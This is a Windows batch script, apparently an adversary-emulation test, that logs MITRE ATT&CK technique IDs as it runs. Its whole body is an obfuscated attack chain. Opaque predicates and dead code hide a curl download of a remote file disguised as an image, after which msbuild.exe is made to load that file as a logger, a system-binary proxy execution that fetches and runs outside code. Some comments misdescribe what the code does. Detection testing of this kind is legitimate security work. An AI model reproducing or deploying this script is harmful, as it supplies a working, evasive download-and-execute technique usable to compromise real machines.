@echo off
setlocal enabledelayedexpansion

REM Obfuscated SET variable preamble (no %APPDATA%\7\macula-simulations.log or %APPDATA%\7)
SET mnbvf=%APPDATA%\10347\43f47c22
SET qwzxc=14af9db2.txt
SET vbnmc=https://10.0.0.49/stage/2/icon.png?10347-7
SET ghzxp=ITZEL-S2BO
SET lkjhg=10347
SET fdsaq=7

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Log file path constructed from endpoint ID
SET wqpla=%APPDATA%\!fdsaq!\macula-simulations.log

REM Opaque predicate: always true using date comparison
SET state=0
:loop
if !state! equ 0 (
    REM Check opaque condition: current year always > 2000
    SET /a _dummy = 1
    if !_dummy! equ 1 (
        REM Phase 0: heartbeat download
        echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: heartbeat_start>> "!wqpla!" 2>nul
        curl -k -s -o "!mnbvf!\!qwzxc!" "!vbnmc!"
        if errorlevel 1 (
            REM Generic download failure log (no T1218 here)
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: heartbeat_fail>> "!wqpla!" 2>nul
        ) else (
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: heartbeat_complete>> "!wqpla!" 2>nul
        )
        SET state=1
        goto loop
    ) else (
        REM Dead code branch - never executes
        echo dead_code_heartbeat>> "!wqpla!" 2>nul
        copy nul "%TEMP%\dummy.txt" >nul 2>&1
        goto loop
    )
) else if !state! equ 1 (
    REM Opaque predicate: time-based always true
    SET /a _hour = 0
    for /f "tokens=1 delims=." %%a in ("!TIME!") do set _hour=%%a
    SET /a _hour = !_hour! + 1 >nul 2>&1
    if !_hour! gtr 0 (
        REM Phase 1: change directory
        echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: chdir_start>> "!wqpla!" 2>nul
        cd /d "!mnbvf!" >nul 2>&1
        if errorlevel 1 (
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: chdir_result=1>> "!wqpla!" 2>nul
        ) else (
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: chdir_result=0>> "!wqpla!" 2>nul
        )
        SET state=2
        goto loop
    ) else (
        REM Dead code
        echo dead_chdir>> "!wqpla!" 2>nul
        goto loop
    )
) else if !state! equ 2 (
    REM Nested conditionals
    IF defined fdsaq (
        IF defined mnbvf (
            REM Opaque: always 1
            SET /a _magic = (5 - 4)
            if !_magic! equ 1 (
                REM Phase 2: create .proj file
                echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: proj_create_start>> "!wqpla!" 2>nul
                echo ^<Project/^> > "!mnbvf!\build.proj"
                if not exist "!mnbvf!\build.proj" (
                    echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: proj_create_result=1>> "!wqpla!" 2>nul
                ) else (
                    echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: proj_create_result=0>> "!wqpla!" 2>nul
                )
                SET state=3
                goto loop
            )
        )
    )
    REM fallback dead code
    echo nested_fail>> "!wqpla!" 2>nul
    goto loop
) else if !state! equ 3 (
    REM Switch-case obfuscation using computed value (always 1)
    SET /a _switchval = (!DATE! / 1) + 0
    if !_switchval! geq 0 (
        if !_switchval! leq 100 (
            REM Phase 3: msbuild invocation
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: msbuild_start>> "!wqpla!" 2>nul
            %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!mnbvf!\build.proj" /logger:LoggerEntry,"!mnbvf!\!qwzxc!";MyParameters,Foo >NUL 2>&1
            set _msb_ec=!errorlevel!
            echo [!tsvar!][DEBUG][!ghzxp!][!lkjhg!]: msbuild_complete>> "!wqpla!" 2>nul
            REM Log T1218 with result
            if !_msb_ec! neq 0 (
                echo [!tsvar!][TTP][!ghzxp!][!lkjhg!]: T1218|System Binary Proxy Execution=[FAIL]:msbuild_exit_nonzero>> "!wqpla!" 2>nul
            ) else (
                echo [!tsvar!][TTP][!ghzxp!][!lkjhg!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!wqpla!" 2>nul
            )
            REM Log T1027 (always OK since obfuscation is applied in script structure)
            echo [!tsvar!][TTP][!ghzxp!][!lkjhg!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!wqpla!" 2>nul
            SET state=-1
            goto loop
        )
    ) else (
        REM Dead code
        echo switch_dead>> "!wqpla!" 2>nul
        goto loop
    )
) else if !state! equ -1 (
    REM End state - do nothing
    goto :EOF
) else (
    REM Failsafe: dead code that resets
    echo.> "!wqpla!" 2>nul
    SET state=0
    goto loop
)

endlocal